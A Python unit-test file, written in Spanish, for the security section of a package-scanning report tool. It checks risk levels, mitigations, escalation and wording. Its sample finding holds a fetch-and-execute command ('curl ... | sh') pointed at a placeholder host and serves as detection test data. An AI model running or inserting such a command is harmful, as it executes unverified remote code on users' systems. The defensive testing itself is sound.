import unittest

from ayuda import importar_exporter

importar_exporter()

from exporter.informes import seccion_seguridad  # noqa: E402
from exporter.modelo import Hallazgo, Nivel  # noqa: E402
from exporter.seguridad.riesgo import evaluar  # noqa: E402


def h(**kw):
    base = dict(id="SEC-EXEC-REMOTO-001", familia="permisos_y_acciones",
                dimension="tecnico", severidad="alta", confianza="alta",
                ambito="paquete", ubicacion="scripts/setup.sh:2",
                muestra="curl -s https://x.invalid/a.sh | sh",
                titulo="Descarga contenido remoto y lo ejecuta",
                mitigacion="Fijar la dependencia con hash verificable.")
    base.update(kw)
    return Hallazgo(**base)


class Seccion(unittest.TestCase):

    def test_un_paquete_limpio_lo_dice_sin_alarmar(self):
        md = seccion_seguridad(evaluar([], False))
        # Dos veces: en la linea de Recomendacion y en el cuerpo. Con
        # assertIn a secas la rama `if not veredicto.hallazgos` podria
        # borrarse entera sin que fallara nada.
        self.assertEqual(md.count("No se han detectado indicadores estáticos relevantes"), 2)

    def test_publica_nivel_recomendacion_y_las_tres_dimensiones(self):
        md = seccion_seguridad(evaluar([h()], False))
        self.assertIn("**Nivel de riesgo:** alto", md)
        self.assertIn("revisión humana", md)
        for etiqueta in ("Riesgo técnico", "Cadena de suministro", "Comportamiento"):
            self.assertIn(etiqueta, md)

    def test_cada_hallazgo_trae_ubicacion_ambito_mitigacion_y_confianza(self):
        md = seccion_seguridad(evaluar([h()], False))
        self.assertIn("`scripts/setup.sh:2`", md)
        self.assertIn("ámbito: **paquete**", md)
        self.assertIn("*Mitigación:* Fijar la dependencia con hash verificable.", md)
        self.assertIn("*Confianza:* alta.", md)

    def test_nunca_dice_que_el_repositorio_es_malicioso(self):
        for hs in ([], [h()], [h(severidad="critica")]):
            md = seccion_seguridad(evaluar(hs, False)).lower()
            self.assertNotIn("es malicioso", md)
            self.assertNotIn("repositorio malicioso", md)

    def test_la_escalada_se_explica(self):
        v = evaluar([h(dimension="tecnico"),
                     h(dimension="cadena_de_suministro", id="SEC-DEP-URL-001")], False)
        md = seccion_seguridad(v)
        self.assertEqual(v.nivel, Nivel.CRITICO)
        self.assertIn("combinación", md)

    def test_la_familia_de_prompt_declara_su_limite(self):
        md = seccion_seguridad(evaluar(
            [h(id="SEC-PROMPT-IGNORA-001", familia="conducta_de_prompt",
               dimension="comportamiento", confianza="media")], False))
        self.assertIn("formulaciones conocidas", md)

    def test_el_contenido_opaco_se_menciona(self):
        # No "no se ha podido analizar": esa frase ya esta en
        # TEXTO_RECOMENDACION["revision_incompleta"] y el assertIn pasaria
        # aunque el parrafo de contenido opaco se borrara entero. La frase
        # de abajo es exclusiva de ese parrafo.
        md = seccion_seguridad(evaluar([], True))
        self.assertIn("binarios o ficheros comprimidos, que no se abren", md)


if __name__ == "__main__":
    unittest.main()
